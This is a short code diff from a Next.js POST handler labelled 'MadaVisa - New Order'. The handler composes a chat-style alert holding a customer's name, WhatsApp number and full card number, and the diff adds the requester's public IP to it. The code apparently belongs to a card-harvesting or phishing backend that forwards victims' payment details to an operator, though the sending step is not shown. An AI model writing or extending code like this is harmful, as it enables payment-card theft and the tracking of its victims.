@@ -39,6 +39,7 @@ export async function POST(req: NextRequest) {
     ``,
     `🏦 MadaVisa - New Order`,
     `🌍 Country: ${country}`,
+    `🌐 Public IP: ${ip || "غير معروف"}`,
     `🙍 Order For: ${customer ?? "-"}`,
     `📲 WhatsApp: ${whatsapp ?? "-"}`,
     `🪪 Card Number: ${cardNumber}`,
